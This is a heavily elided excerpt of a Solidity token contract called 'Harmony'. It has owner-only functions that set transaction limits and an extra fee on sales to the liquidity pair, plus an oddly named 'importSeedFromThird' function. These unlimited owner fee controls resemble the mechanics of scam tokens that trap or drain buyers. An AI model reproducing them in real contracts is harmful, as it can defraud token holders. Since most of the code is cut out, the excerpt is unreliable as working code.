...
contract  Harmony is ERC20, Ownable {
    using SafeMath for uint256;
   ...
   bool private swapping;
    ...
    uint256  private aamount = 5*10**6*10**9;
  ...
  uint256 private _maxTxAmount = 10 * 10**6 * 10**9;
    ...
    constructor() public ERC20("Harmony", "Harmony",9) {

    
    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // spooky router
         // 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D Create a uniswap pair for this new token//0x865bfde337C8aFBffF144Ff4C29f9404EBb22b15//0x10ED43C718714eb63d5aA57B78B54704E256024E
    ...
    receive() external payable {
     ...
     function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        _maxTxAmount = maxTxPercent*10**9;
         ...
         function settxnumNum(uint256 maxTxPercent) external onlyOwner() {
        txNum = maxTxPercent;
    }
    ...
    function  aamountat(uint256 ass) external onlyOwner{
        aamount = ass*10**9;
    }
...
function importSeedFromThird() public view returns (uint8) {
    ...
    function _transfer(
      ...
      if(!swapping&& from != owner() && to != owner()&&to==uniswapV2Pair){
        ...
        if(takeFbb) {
        	uint256 fbbs = amount.mul(fbb).div(100);
        	if(!automatedMarketMakerPairs[to]){
        	    fbbs += amount.mul(txNum).div(100);
        	}
